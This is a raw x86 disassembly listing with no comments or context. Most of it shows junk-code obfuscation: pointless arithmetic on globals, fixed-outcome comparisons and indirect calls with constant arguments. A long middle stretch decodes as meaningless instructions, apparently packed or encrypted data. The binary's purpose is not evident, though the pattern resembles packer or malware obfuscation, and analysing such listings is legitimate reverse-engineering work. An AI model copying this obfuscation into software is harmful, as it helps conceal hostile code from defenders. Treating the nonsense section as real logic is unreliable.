  41c979:	mov    ecx,0x5cee
  41c97e:	cmp    DWORD PTR ds:0x42857d,0x0
  41c985:	jl     0x41c9b9
  41c98b:	push   0x8e3c
  41c990:	call   DWORD PTR ds:0x42e070
  41c996:	movzx  ecx,BYTE PTR ds:0x42847d
  41c99d:	sbb    DWORD PTR ds:0x428469,ecx
  41c9a3:	xor    DWORD PTR ds:0x42856d,edx
  41c9a9:	mov    DWORD PTR ds:0x4284e1,0x54fa
  41c9b3:	adc    DWORD PTR ds:0x428455,ebx
  41c9b9:	xor    ecx,DWORD PTR ds:0x428565
  41c9bf:	sub    DWORD PTR ds:0x428431,0x73c7
  41c9c9:	or     eax,0x4f70
  41c9ce:	cmp    DWORD PTR ds:0x42842d,0x0
  41c9d5:	mov    ecx,0x6758
  41c9da:	mov    ecx,0x329e
  41c9df:	mov    DWORD PTR ds:0x4284c5,ecx
  41c9e5:	mov    DWORD PTR ds:0x428469,edi
  41c9eb:	jmp    0x41ca37
  41c9f0:	mov    DWORD PTR ds:0x428365,0x5f4d
  41c9fa:	cmp    DWORD PTR ds:0x42842d,0x0
  41ca01:	jae    0x41ca29
  41ca07:	push   0x67b2
  41ca0c:	push   0x4f13
  41ca11:	call   DWORD PTR ds:0x42e074
  41ca17:	add    ecx,0x3ae9
  41ca1d:	sub    ecx,DWORD PTR ds:0x428359
  41ca23:	xor    ecx,DWORD PTR ds:0x42842d
  41ca29:	adc    DWORD PTR ds:0x42832d,ecx
  41ca2f:	adc    ecx,DWORD PTR ds:0x42842d
  41ca35:	not    ecx
  41ca37:	mov    ecx,DWORD PTR [ebp-0x28]
  41ca3a:	or     DWORD PTR ds:0x42847d,0x428461
  41ca44:	or     eax,ecx
  41ca46:	xor    ecx,ecx
  41ca48:	xor    ecx,DWORD PTR ds:0x428361
  41ca4e:	xor    DWORD PTR ds:0x428551,ecx
  41ca54:	sub    eax,0x5ff7
  41ca59:	mov    ecx,DWORD PTR ds:0x428359
  41ca5f:	sub    ecx,DWORD PTR ds:0x4284e9
  41ca65:	mov    DWORD PTR ds:0x428359,ecx
  41ca6b:	mov    DWORD PTR [ebp-0xc8],eax
  41ca71:	sub    DWORD PTR ds:0x428501,0xac
  41ca7b:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41ca85:	cmp    DWORD PTR ds:0x428445,0x0
  41ca8c:	mov    DWORD PTR ds:0x428351,edi
  41ca92:	mov    DWORD PTR ds:0x42841d,edx
  41ca98:	jmp    0x41cafc
  41ca9d:	mov    DWORD PTR ds:0x428429,edx
  41caa3:	mov    DWORD PTR ds:0x4284f9,ebx
  41caa9:	cmp    DWORD PTR ds:0x428445,0x0
  41cab0:	jbe    0x41cad5
  41cab6:	push   DWORD PTR [ebp-0x1c]
  41cab9:	call   DWORD PTR ds:0x42e128
  41cabf:	sub    DWORD PTR ds:0x428501,edi
  41cac5:	xor    ecx,ecx
  41cac7:	add    ecx,DWORD PTR ds:0x428591
  41cacd:	mov    ecx,DWORD PTR [ecx]
  41cacf:	adc    DWORD PTR ds:0x42845d,ecx
  41cad5:	and    ecx,DWORD PTR ds:0x428551
  41cadb:	sub    ecx,ecx
  41cadd:	xor    ecx,ecx
  41cadf:	or     ecx,DWORD PTR ds:0x428559
  41cae5:	and    ecx,DWORD PTR ds:0x428461
  41caeb:	mov    DWORD PTR ds:0x428559,ecx
  41caf1:	adc    ecx,DWORD PTR ds:0x428409
  41caf7:	or     eax,0x53d3
  41cafc:	mov    DWORD PTR [ebp-0xc4],0x6236
  41cb06:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41cb0d:	jmp    0x41cef4
  41cb12:	pop    ebx
  41cb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb14:	jmp    0x31aa:0x7b9c3cd8
  41cb1b:	add    al,0x9a
  41cb1d:	jecxz  0x41cb5d
  41cb1f:	dec    eax
  41cb20:	ins    BYTE PTR es:[edi],dx
  41cb21:	shr    ebx,1
  41cb23:	dec    ecx
  41cb24:	sar    BYTE PTR [esi-0x41413bb6],0x16
  41cb2b:	int    0x6f
  41cb2d:	fst    DWORD PTR [ebp+eax*2-0x6a6d37ae]
  41cb34:	repz pop eax
  41cb36:	adc    DWORD PTR [ecx],esp
  41cb38:	adc    DWORD PTR [ecx-0x6943bd9e],ebx
  41cb3e:	leave  
  41cb3f:	test   BYTE PTR [ecx],al
  41cb41:	hlt    
  41cb42:	mov    ecx,DWORD PTR [esi]
  41cb44:	out    dx,al
  41cb45:	mov    al,BYTE PTR [edi]
  41cb47:	in     eax,dx
  41cb48:	into   
  41cb49:	call   0x9eb5:0x27a80de8
  41cb50:	movups XMMWORD PTR [eax],xmm3
  41cb53:	je     0x41cb96
  41cb55:	aaa    
  41cb56:	push   ebp
  41cb57:	aaa    
  41cb58:	push   ebp
  41cb59:	adc    dl,BYTE PTR [edi+0x418312e3]
  41cb5f:	loop   0x41cb49
  41cb61:	repz pop esi
  41cb63:	mov    edi,esp
  41cb65:	fistp  QWORD PTR [edx-0x27cc03ab]
  41cb6b:	test   DWORD PTR [edx-0x2c],ecx
  41cb6e:	test   BYTE PTR [ebx-0x57],cl
  41cb71:	rol    BYTE PTR [edi],cl
  41cb73:	or     eax,0x7b641c7e
  41cb78:	mov    WORD PTR [ecx+ebp*1-0x33],gs
  41cb7c:	dec    ebx
  41cb7d:	cmp    eax,0xa3c8df8a
  41cb82:	sub    BYTE PTR [esi],ah
  41cb84:	xor    eax,0x4113556b
  41cb89:	into   
  41cb8a:	and    eax,DWORD PTR [edi]
  41cb8c:	iret   
  41cb8d:	jb     0x41cc01
  41cb8f:	xor    BYTE PTR [ebx+esi*4+0x3f7bae6],ah
  41cb96:	xchg   esp,eax
  41cb97:	into   
  41cb98:	pop    eax
  41cb99:	test   BYTE PTR ds:0x877a267d,0x26
  41cba0:	mul    DWORD PTR [ebx-0x20]
  41cba3:	pop    esi
  41cba4:	dec    eax
  41cba5:	in     al,dx
  41cba6:	adc    bh,dh
  41cba8:	mov    ds:0x3eb8d8f1,al
  41cbad:	test   DWORD PTR [esi],esi
  41cbaf:	nop
  41cbb0:	or     eax,0x906812a4
  41cbb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbb6:	dec    esi
  41cbb7:	sbb    BYTE PTR [ebx],bh
  41cbb9:	vaddss xmm0,xmm4,DWORD PTR [ebx+0x21]
  41cbbe:	test   al,0xb
  41cbc0:	sbb    ah,dl
  41cbc2:	mov    BYTE PTR [edi+0x16b83155],ch
  41cbc8:	sbb    edx,DWORD PTR [eax+0x2b77cc1]
  41cbce:	or     al,0xa7
  41cbd0:	scas   al,BYTE PTR es:[edi]
  41cbd1:	into   
  41cbd2:	cdq    
  41cbd3:	call   FWORD PTR [esi]
  41cbd5:	in     al,dx
  41cbd6:	aad    0x54
  41cbd8:	add    edi,DWORD PTR [edx+0x4d]
  41cbdb:	dec    ebp
  41cbdc:	(bad)  
  41cbdd:	rcl    DWORD PTR ss:[ebx+edi*8],1
  41cbe1:	loope  0x41cb98
  41cbe3:	stos   DWORD PTR es:[edi],eax
  41cbe4:	popa   
  41cbe5:	pop    ebx
  41cbe6:	inc    eax
  41cbe7:	dec    eax
  41cbe8:	push   ebp
  41cbe9:	dec    ebx
  41cbea:	repnz aas 
  41cbec:	fbstp  TBYTE PTR [eax+0x2310f006]
  41cbf2:	stc    
  41cbf3:	push   ss
  41cbf4:	rcr    DWORD PTR [edx-0x59022ba5],1
  41cbfa:	add    ebp,esp
  41cbfc:	add    DWORD PTR [ebp-0x2ac48f58],eax
  41cc02:	stos   BYTE PTR es:[edi],al
  41cc03:	inc    eax
  41cc04:	mov    bh,BYTE PTR [edx+0x3]
  41cc07:	push   ecx
  41cc08:	jb     0x41cc63
  41cc0a:	test   al,0x21
  41cc0c:	adc    DWORD PTR [edx+0x5d],ebx
  41cc0f:	and    al,0xc8
  41cc11:	scas   al,BYTE PTR es:[edi]
  41cc12:	xor    BYTE PTR [esi],al
  41cc14:	in     eax,0x71
  41cc16:	mov    fs,WORD PTR [ecx]
  41cc18:	mov    ds:0xbc7888ec,eax
  41cc1d:	cmp    BYTE PTR [eax],al
  41cc1f:	iret   
  41cc20:	shl    BYTE PTR [ecx],0xde
  41cc23:	add    DWORD PTR [edi+edx*8-0x67],0xf
  41cc28:	int3   
  41cc29:	aaa    
  41cc2a:	xchg   esp,eax
  41cc2b:	mov    DWORD PTR [edx+esi*2],0x356ef4bb
  41cc32:	jmp    0x78d008e7
  41cc37:	mov    edx,0x4238c607
  41cc3c:	jle    0x41cc9f
  41cc3e:	xchg   edx,eax
  41cc3f:	or     eax,0xe89357a7
  41cc44:	xchg   ecx,eax
  41cc45:	dec    esi
  41cc46:	mov    ds:0x4078505d,eax
  41cc4b:	das    
  41cc4c:	jle    0x41cc70
  41cc4e:	dec    edx
  41cc4f:	aad    0x4a
  41cc51:	xor    al,0xd4
  41cc53:	mov    eax,ds:0x2e1873b3
  41cc58:	adc    eax,0xdc2402ae
  41cc5d:	mov    ecx,0xb64f612c
  41cc62:	add    eax,0x1dfe63a9
  41cc67:	jmp    0x41cc26
  41cc69:	adc    DWORD PTR [eax],edx
  41cc6b:	xor    BYTE PTR [eax+0x5910f6a2],dl
  41cc71:	xchg   edx,eax
  41cc72:	mov    ds:0xaa1145c7,al
  41cc77:	jbe    0x41cc07
  41cc79:	jb     0x41cc0d
  41cc7b:	sar    BYTE PTR [ecx+0x37],0x7c
  41cc7f:	jl     0x41ccb2
  41cc81:	push   0xffffffb5
  41cc83:	sub    dl,cl
  41cc85:	sahf   
  41cc86:	dec    edx
  41cc87:	jbe    0x41cce5
  41cc89:	add    cl,dl
  41cc8b:	xchg   ecx,eax
  41cc8c:	xor    eax,0xeea16a04
  41cc91:	add    DWORD PTR [edx+0x77feecc],edx
  41cc97:	xchg   edx,eax
  41cc98:	or     dh,ch
  41cc9a:	inc    edx
  41cc9b:	push   esp
  41cc9c:	les    edx,FWORD PTR [ebp-0x46302986]
  41cca2:	rcr    DWORD PTR [ecx],cl
  41cca4:	sub    edi,DWORD PTR [eax]
  41cca6:	mov    bh,0x47
  41cca8:	pop    edx
  41cca9:	mov    DWORD PTR [ebx],ebp
  41ccab:	ja     0x41ccb2
  41ccad:	test   al,0x7c
  41ccaf:	stc    
  41ccb0:	mov    ch,0x7b
  41ccb2:	mov    esp,0xa448f308
  41ccb7:	pop    eax
  41ccb8:	(bad)  
  41ccb9:	aaa    
  41ccba:	mov    ds:0xfa8ceb40,eax
  41ccbf:	lds    ebx,FWORD PTR [ecx]
  41ccc1:	in     eax,dx
  41ccc2:	dec    ebp
  41ccc3:	mov    ah,BYTE PTR [edx+esi*2-0x37f6a4a8]
  41ccca:	xchg   esp,ebx
  41cccc:	outs   dx,DWORD PTR ds:[esi]
  41cccd:	adc    al,BYTE PTR [edx+0x5a503823]
  41ccd3:	adc    al,dh
  41ccd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccd6:	mov    dh,0xff
  41ccd8:	or     eax,0xab52f903
  41ccdd:	mov    ebx,0xeed0a461
  41cce2:	scas   al,BYTE PTR es:[edi]
  41cce3:	fist   WORD PTR [edx]
  41cce5:	cmp    eax,0xdcf7841
  41ccea:	setge  ah
  41cced:	mov    ebp,0x55ac6b63
  41ccf2:	in     al,dx
  41ccf3:	leave  
  41ccf4:	push   edi
  41ccf5:	retf   
  41ccf6:	lea    eax,[ebx]
  41ccf8:	pushf  
  41ccf9:	imul   eax,DWORD PTR [eax-0x48],0xc94c787c
  41cd00:	inc    ebx
  41cd01:	shl    ch,1
  41cd03:	outs   dx,BYTE PTR ds:[esi]
  41cd04:	lds    esi,FWORD PTR [edi+0x36eb9984]
  41cd0a:	xchg   ebp,eax
  41cd0b:	scas   al,BYTE PTR es:[edi]
  41cd0c:	mov    BYTE PTR [eax],ah
  41cd0e:	test   ah,ch
  41cd10:	loopne 0x41ccd8
  41cd12:	(bad)  
  41cd13:	mov    eax,ds:0xf49b7817
  41cd18:	js     0x41cd10
  41cd1a:	in     al,dx
  41cd1b:	xor    edx,edx
  41cd1d:	push   edx
  41cd1e:	push   0xa3fc529f
  41cd23:	fcmovnb st,st(0)
  41cd25:	out    0xcc,al
  41cd27:	icebp  
  41cd28:	xor    eax,0x9f2fe46f
  41cd2d:	dec    esi
  41cd2e:	fwait
  41cd2f:	mov    ch,0x10
  41cd31:	sbb    DWORD PTR [edi+0xb413d62],edi
  41cd37:	or     eax,0x287bef6e
  41cd3c:	jle    0x41cd22
  41cd3e:	lods   eax,DWORD PTR ds:[esi]
  41cd3f:	jnp    0x41cd88
  41cd41:	ds pop esp
  41cd43:	(bad)  
  41cd44:	mov    al,ds:0xcdfa7eb8
  41cd49:	lock lds esp,FWORD PTR [eax]
  41cd4c:	cmp    al,0x6
  41cd4e:	dec    ebp
  41cd4f:	lea    ebx,[ebp-0x57a88753]
  41cd55:	fdiv   DWORD PTR [esi-0x6c]
  41cd58:	sbb    edx,DWORD PTR [esi+0x63]
  41cd5b:	out    dx,al
  41cd5c:	loopne 0x41cd89
  41cd5e:	xor    eax,0x267a3fa3
  41cd63:	shl    DWORD PTR [ebx],cl
  41cd65:	dec    edi
  41cd66:	sar    DWORD PTR [edx],cl
  41cd68:	jno    0x41cd28
  41cd6a:	xchg   edi,eax
  41cd6b:	pop    ebp
  41cd6c:	out    0xf2,eax
  41cd6e:	mov    ds:0xf38f4fba,eax
  41cd73:	pushf  
  41cd74:	loop   0x41cd58
  41cd76:	popa   
  41cd77:	push   cs
  41cd78:	fdivr  QWORD PTR [ecx]
  41cd7a:	and    al,0xed
  41cd7c:	sub    DWORD PTR [edx-0x47ba1197],esi
  41cd82:	add    BYTE PTR [edx-0x46],ch
  41cd85:	or     edi,DWORD PTR [edi-0x177a434d]
  41cd8b:	and    eax,0x6e98fc30
  41cd90:	out    dx,al
  41cd91:	push   es
  41cd92:	ror    DWORD PTR [esi-0x3c],0x51
  41cd96:	mov    bh,0x3b
  41cd98:	out    0x47,eax
  41cd9a:	(bad)  
  41cd9c:	enter  0x6c91,0xeb
  41cda0:	sti    
  41cda1:	cmp    ecx,edx
  41cda3:	retf   0xd752
  41cda6:	das    
  41cda7:	fisub  DWORD PTR [edi-0x3c]
  41cdaa:	dec    esi
  41cdab:	shr    BYTE PTR [edi-0x60],1
  41cdae:	test   bl,0x47
  41cdb1:	aaa    
  41cdb2:	int3   
  41cdb3:	cmp    DWORD PTR [esi+ebp*4-0x1b17e7ab],ebx
  41cdba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdbb:	test   al,0xc8
  41cdbd:	outs   dx,DWORD PTR ds:[esi]
  41cdbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdc0:	addr16 cmc 
  41cdc2:	into   
  41cdc3:	ret    0xbf93
  41cdc6:	push   edi
  41cdc7:	(bad)  
  41cdc8:	fdivr  QWORD PTR [edi]
  41cdca:	pop    ss
  41cdcb:	shr    edi,1
  41cdcd:	aaa    
  41cdce:	or     dl,bl
  41cdd0:	cmp    edx,DWORD PTR [edi]
  41cdd2:	(bad)  
  41cdd4:	cmp    eax,0xc1b15410
  41cdd9:	jmp    0x41cde0
  41cddb:	and    esi,esp
  41cddd:	ficomp WORD PTR [edx-0x44de880d]
  41cde3:	fistp  DWORD PTR [edx]
  41cde5:	pop    edi
  41cde6:	cmp    DWORD PTR [ecx-0x6bf0a61b],ebx
  41cdec:	popa   
  41cded:	jne    0x41ce50
  41cdef:	or     esi,edx
  41cdf1:	and    ch,dh
  41cdf3:	xor    dl,bl
  41cdf5:	mov    ds:0xd6b6f620,eax
  41cdfa:	loope  0x41cdba
  41cdfc:	bound  esp,QWORD PTR [eax+0x39709757]
  41ce02:	inc    eax
  41ce03:	stc    
  41ce04:	das    
  41ce05:	pusha  
  41ce06:	dec    ecx
  41ce07:	mov    ebp,DWORD PTR [esi-0x3a]
  41ce0a:	fbld   TBYTE PTR [ecx+esi*8+0x2fa783e0]
  41ce11:	sub    dl,dl
  41ce13:	mov    ds:0x17deaf3f,al
  41ce18:	push   es
  41ce19:	int    0x7c
  41ce1b:	dec    ecx
  41ce1c:	cmp    al,0x89
  41ce1e:	out    0xbc,al
  41ce20:	mov    bl,0x79
  41ce22:	ss in  eax,dx
  41ce24:	aad    0xca
  41ce26:	inc    BYTE PTR [esi-0x76315960]
  41ce2c:	mov    es,WORD PTR [ebp-0x11]
  41ce2f:	push   0x7fe919ca
  41ce34:	jmp    0x824:0x7f2a98e8
  41ce3b:	mov    esi,0x9aa978be
  41ce40:	adc    DWORD PTR [ebx-0x54209da6],0xfe0054ce
  41ce4a:	lods   eax,DWORD PTR ds:[esi]
  41ce4b:	or     dh,BYTE PTR [ebp-0x9]
  41ce4e:	pop    es
  41ce4f:	lahf   
  41ce50:	push   ecx
  41ce51:	mov    esi,DWORD PTR [ebx]
  41ce53:	fwait
  41ce54:	jae    0x41ce30
  41ce56:	and    bh,BYTE PTR [esi+ecx*1]
  41ce59:	add    al,0x65
  41ce5b:	or     DWORD PTR [ecx+0x64],0x7eb02899
  41ce62:	dec    edx
  41ce63:	xor    dh,BYTE PTR [edi-0x481d1313]
  41ce69:	adc    al,0x61
  41ce6b:	xor    eax,0x31f58a92
  41ce70:	sar    DWORD PTR [edi-0x56b88ad5],0xc8
  41ce77:	je     0x41ce47
  41ce79:	cmc    
  41ce7a:	out    dx,eax
  41ce7b:	or     eax,0x9aaa407a
  41ce80:	pop    es
  41ce81:	push   edx
  41ce82:	or     ecx,ecx
  41ce84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce85:	or     al,0x52
  41ce87:	in     al,0xb1
  41ce89:	cmc    
  41ce8a:	mov    ah,al
  41ce8c:	icebp  
  41ce8d:	aaa    
  41ce8e:	xor    al,0x6b
  41ce90:	push   ebx
  41ce91:	or     eax,0x25441303
  41ce96:	mov    cl,cl
  41ce98:	jae    0x41ce24
  41ce9a:	mov    al,ds:0xb93d7ba5
  41ce9f:	dec    ebx
  41cea0:	mov    ebp,0xfa70fff8
  41cea5:	jl     0x41ce65
  41cea7:	xchg   esi,eax
  41cea8:	test   DWORD PTR [edx],ebx
  41ceaa:	aaa    
  41ceab:	shr    DWORD PTR [ebp+0x49],1
  41ceae:	add    edi,DWORD PTR [edi]
  41ceb0:	push   ecx
  41ceb1:	inc    edi
  41ceb2:	push   esi
  41ceb3:	sub    al,0x2a
  41ceb5:	sub    eax,0x8ebc59ef
  41ceba:	retf   0x5247
  41cebd:	adc    ch,cl
  41cebf:	jae    0x41ce9c
  41cec1:	js     0x41ce85
  41cec3:	add    dh,BYTE PTR [edx+0x33e1b412]
  41cec9:	sub    eax,0x638768a0
  41cece:	xchg   BYTE PTR [ebp+0x1],ah
  41ced1:	stos   DWORD PTR es:[edi],eax
  41ced2:	aam    0x75
  41ced4:	jmp    0x24be:0xa22eca17
  41cedb:	fs icebp 
  41cedd:	sti    
  41cede:	jne    0x41ce9b
  41cee0:	inc    edx
  41cee1:	cmp    edx,DWORD PTR [edx+0x6e]
  41cee4:	and    eax,0x9cda8996
  41cee9:	push   ebp
  41ceea:	loope  0x41ce85
  41ceec:	and    eax,0xd73305e2
  41cef1:	stc    
  41cef2:	sub    eax,0xd885c7b1
  41cef7:	(bad)  
  41cef8:	(bad)  
  41cef9:	push   DWORD PTR [edi]
  41cefb:	jne    0x41cefd
  41cefd:	add    BYTE PTR [ecx],dh
  41ceff:	adc    eax,0x428479
  41cf04:	mov    DWORD PTR [ebp-0x114],0x6985
  41cf0e:	and    DWORD PTR ds:0x4284e9,ebx
  41cf14:	mov    DWORD PTR [ebp-0x14],0x5627
  41cf1b:	or     DWORD PTR ds:0x428451,0x428555
  41cf25:	mov    DWORD PTR [ebp-0x64],0x72e7
  41cf2c:	mov    eax,DWORD PTR [ebp-0x14]
  41cf2f:	and    DWORD PTR ds:0x428551,ebx
  41cf35:	add    eax,DWORD PTR [ebp-0x64]
  41cf38:	mov    ecx,DWORD PTR [ebp-0x114]
  41cf3e:	sbb    DWORD PTR ds:0x4284d5,0x42833d
  41cf48:	sub    eax,ecx
  41cf4a:	xor    DWORD PTR ds:0x428371,edi
  41cf50:	mov    ecx,DWORD PTR [ebp-0x128]
  41cf56:	imul   eax,ecx
  41cf59:	cmp    DWORD PTR ds:0x428565,0x0
  41cf60:	mov    DWORD PTR ds:0x428501,0x44b
  41cf6a:	mov    ecx,DWORD PTR ds:0x428481
  41cf70:	mov    ecx,DWORD PTR ds:0x42847d
  41cf76:	mov    ecx,0x4ae9
  41cf7b:	jmp    0x41cfe3
  41cf80:	mov    ecx,DWORD PTR ds:0x4284f9
  41cf86:	mov    DWORD PTR ds:0x42834d,0x5810
  41cf90:	cmp    DWORD PTR ds:0x428565,0x0
  41cf97:	ja     0x41cfcd
  41cf9d:	push   0x42855d
  41cfa2:	push   0x16d1
  41cfa7:	push   DWORD PTR [ebp-0x20]
  41cfaa:	push   0x7e78
  41cfaf:	call   DWORD PTR ds:0x42e078
  41cfb5:	mov    ecx,DWORD PTR ds:0x42833d
  41cfbb:	sbb    DWORD PTR ds:0x42857d,ecx
  41cfc1:	sub    DWORD PTR ds:0x42843d,ecx
  41cfc7:	not    DWORD PTR ds:0x4284f9
  41cfcd:	xor    DWORD PTR ds:0x4284f5,edi
  41cfd3:	mov    DWORD PTR ds:0x428435,0x4e0f
  41cfdd:	xor    ecx,DWORD PTR ds:0x428551
  41cfe3:	imul   eax,eax,0xe4e
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x7c]
  41cfec:	or     eax,ecx
  41cfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff1:	adc    DWORD PTR ds:0x428571,0xad
  41cffb:	lea    eax,[ecx+eax*1+0x46210209]
  41d002:	add    DWORD PTR ds:0x428449,0x55ef
  41d00c:	push   eax
  41d00d:	call   0x410df4
  41d012:	mov    ecx,eax
  41d014:	cmp    DWORD PTR ds:0x42833d,0x0
  41d01b:	mov    esi,DWORD PTR ds:0x428575
  41d021:	mov    DWORD PTR ds:0x428441,0x25c4
  41d02b:	jmp    0x41d0fd
  41d030:	mov    DWORD PTR ds:0x42846d,0x7eed
  41d03a:	mov    DWORD PTR ds:0x42855d,edx
  41d040:	cmp    DWORD PTR ds:0x42833d,0x0
  41d047:	jbe    0x41d070
  41d04d:	push   0x428371
  41d052:	call   DWORD PTR ds:0x42e2a0
  41d058:	and    esi,esi
  41d05a:	and    esi,DWORD PTR ds:0x4284d9
  41d060:	mov    esi,DWORD PTR ds:0x428511
  41d066:	mov    esi,DWORD PTR [esi]
  41d068:	xor    DWORD PTR ds:0x4284e9,esi
  41d06e:	xor    esi,esi
  41d070:	add    DWORD PTR ds:0x428355,ebx
  41d076:	movzx  esi,BYTE PTR ds:0x428561
  41d07d:	sbb    DWORD PTR ds:0x428465,esi
  41d083:	sbb    DWORD PTR ds:0x428569,0x428419
  41d08d:	or     esi,esi
  41d08f:	cmp    DWORD PTR ds:0x42836d,0x0
  41d096:	mov    DWORD PTR ds:0x4284f1,0x3cb6
  41d0a0:	mov    esi,0x65ca
  41d0a5:	mov    DWORD PTR ds:0x428501,edi
  41d0ab:	jmp    0x41d0fd
  41d0b0:	mov    DWORD PTR ds:0x42855d,edi
  41d0b6:	mov    eax,0x6c7b
  41d0bb:	cmp    DWORD PTR ds:0x42836d,0x0
  41d0c2:	jg     0x41d0eb
  41d0c8:	push   0x1a0a
  41d0cd:	push   DWORD PTR [ebp-0x24]
  41d0d0:	push   DWORD PTR [ebp-0xc]
  41d0d3:	call   DWORD PTR ds:0x42e12c
  41d0d9:	and    DWORD PTR ds:0x42854d,edx
  41d0df:	xor    DWORD PTR ds:0x428359,ebx
  41d0e5:	sub    esi,0x4c5f
  41d0eb:	sbb    DWORD PTR ds:0x428331,0x56b4
  41d0f5:	sbb    esi,esi
  41d0f7:	add    DWORD PTR ds:0x428449,ebx
  41d0fd:	mov    eax,DWORD PTR [ebp-0xc4]
  41d103:	imul   eax,eax,0x21b3
  41d109:	cmp    DWORD PTR ds:0x428355,0x0
  41d110:	mov    esi,0x3999
  41d115:	movzx  esi,BYTE PTR ds:0x428561
  41d11c:	mov    esi,0x5e4b
  41d121:	mov    esi,DWORD PTR ds:0x428339
  41d127:	jmp    0x41d1a8
  41d12c:	mov    DWORD PTR ds:0x4284ed,0x7a2a
  41d136:	not    esi
  41d138:	cmp    DWORD PTR ds:0x428355,0x0
  41d13f:	jb     0x41d183
  41d145:	push   0x5450
  41d14a:	push   0x3c7c
  41d14f:	call   DWORD PTR ds:0x42e07c
  41d155:	mov    esi,DWORD PTR ds:0x428549
  41d15b:	add    esi,DWORD PTR ds:0x42846d
  41d161:	mov    DWORD PTR ds:0x428549,esi
  41d167:	mov    esi,DWORD PTR ds:0x428411
  41d16d:	and    esi,DWORD PTR ds:0x428439
  41d173:	mov    DWORD PTR ds:0x428411,esi
  41d179:	sbb    DWORD PTR ds:0x428481,0x6b94
  41d183:	mov    esi,DWORD PTR ds:0x42844d
  41d189:	add    DWORD PTR ds:0x4284d5,esi
  41d18f:	movzx  esi,WORD PTR ds:0x428449
  41d196:	adc    esi,DWORD PTR ds:0x428365
  41d19c:	mov    DWORD PTR ds:0x428449,esi
  41d1a2:	xor    DWORD PTR ds:0x428339,edi
  41d1a8:	add    eax,DWORD PTR [ebp-0xe4]
  41d1ae:	and    eax,0xd5c
  41d1b3:	sub    eax,0x2e81
  41d1b8:	xor    edx,edx
  41d1ba:	sbb    DWORD PTR ds:0x42835d,ebx
  41d1c0:	mov    esi,0x2f1dc
  41d1c5:	or     DWORD PTR ds:0x428345,0x1bf3
  41d1cf:	div    esi
  41d1d1:	cmp    DWORD PTR ds:0x42845d,0x0
  41d1d8:	mov    DWORD PTR ds:0x428551,0x7c0f
  41d1e2:	mov    DWORD PTR ds:0x428479,0x21cd
  41d1ec:	mov    esi,DWORD PTR ds:0x428331
  41d1f2:	jmp    0x41d24d
  41d1f7:	mov    DWORD PTR ds:0x42857d,0x7012
  41d201:	mov    esi,0x5ebc
  41d206:	cmp    DWORD PTR ds:0x42845d,0x0
  41d20d:	jne    0x41d239
  41d213:	push   0x389e
  41d218:	push   0x768e
  41d21d:	push   0x6d0b
  41d222:	push   0x8403
  41d227:	call   DWORD PTR ds:0x42e130
  41d22d:	sbb    edx,DWORD PTR ds:0x428475
  41d233:	add    edx,0x16c4
  41d239:	movzx  esi,WORD PTR ds:0x428405
  41d240:	adc    DWORD PTR ds:0x4284d5,esi
  41d246:	sub    DWORD PTR ds:0x4284e9,edx
  41d24c:	inc    esi
  41d24d:	xor    eax,0x56ef
  41d252:	add    DWORD PTR ds:0x428561,0x7098
  41d25c:	add    ecx,eax
  41d25e:	cmp    DWORD PTR ds:0x428439,0x0
  41d265:	mov    DWORD PTR ds:0x42835d,0x1f02
  41d26f:	mov    esi,0x4128
  41d274:	mov    esi,DWORD PTR ds:0x4284cd
  41d27a:	jmp    0x41d2f7
  41d27f:	mov    DWORD PTR ds:0x42854d,ebx
  41d285:	movzx  eax,WORD PTR ds:0x42841d
  41d28c:	cmp    DWORD PTR ds:0x428439,0x0
  41d293:	jb     0x41d2d0
  41d299:	push   0x4840
  41d29e:	push   DWORD PTR [ebp-0x14]
  41d2a1:	push   0x75a6
  41d2a6:	push   DWORD PTR [ebp-0xc]
  41d2a9:	push   0x428243
  41d2ae:	push   DWORD PTR [ebp-0x28]
  41d2b1:	call   DWORD PTR ds:0x42e134
  41d2b7:	movzx  esi,BYTE PTR ds:0x428549
  41d2be:	xor    DWORD PTR ds:0x4284e5,esi
  41d2c4:	xor    esi,edx
  41d2c6:	or     DWORD PTR ds:0x428471,0x2eb3
  41d2d0:	xor    DWORD PTR ds:0x42855d,ebx
  41d2d6:	adc    edx,DWORD PTR ds:0x428571
  41d2dc:	add    DWORD PTR ds:0x42834d,0x1b5f
  41d2e6:	mov    esi,DWORD PTR ds:0x428519
  41d2ec:	mov    edx,DWORD PTR ds:0x4285b1
  41d2f2:	sub    edx,esi
  41d2f4:	sub    esi,DWORD PTR [esi+edx*1]
  41d2f7:	mov    DWORD PTR [ebp-0x90],ecx
  41d2fd:	mov    DWORD PTR [ebp-0xe0],0x7a31
  41d307:	mov    DWORD PTR ds:0x42843d,0x52c8
  41d311:	mov    DWORD PTR [ebp-0x44],0x2514
  41d318:	mov    DWORD PTR [ebp-0xdc],0x699c
  41d322:	cmp    DWORD PTR ds:0x4284d9,0x0
  41d329:	mov    DWORD PTR ds:0x428501,0x628e
  41d333:	movzx  ecx,BYTE PTR ds:0x428351
  41d33a:	mov    ecx,DWORD PTR ds:0x428431
  41d340:	jmp    0x41d3bd
  41d345:	mov    DWORD PTR ds:0x42840d,0x21ce
  41d34f:	mov    DWORD PTR ds:0x428369,edi
  41d355:	cmp    DWORD PTR ds:0x4284d9,0x0
  41d35c:	jge    0x41d39a
  41d362:	push   DWORD PTR [ebp-0x20]
  41d365:	push   DWORD PTR [ebp-0xc]
  41d368:	push   DWORD PTR [ebp-0x18]
  41d36b:	call   DWORD PTR ds:0x42e138
  41d371:	mov    ecx,DWORD PTR ds:0x428395
  41d377:	mov    edx,DWORD PTR ds:0x4285b9
  41d37d:	sub    ecx,edx
  41d37f:	sub    ecx,DWORD PTR [ecx+edx*1]
  41d382:	sub    ecx,0x1d69
  41d388:	mov    ecx,DWORD PTR ds:0x4284b5
  41d38e:	mov    edx,DWORD PTR ds:0x4285ad
  41d394:	sub    ecx,edx
  41d396:	imul   ecx,DWORD PTR [ecx+edx*1]
  41d39a:	sbb    DWORD PTR ds:0x4284f1,0x4f1
  41d3a4:	sub    esi,DWORD PTR ds:0x42857d
  41d3aa:	xor    esi,esi
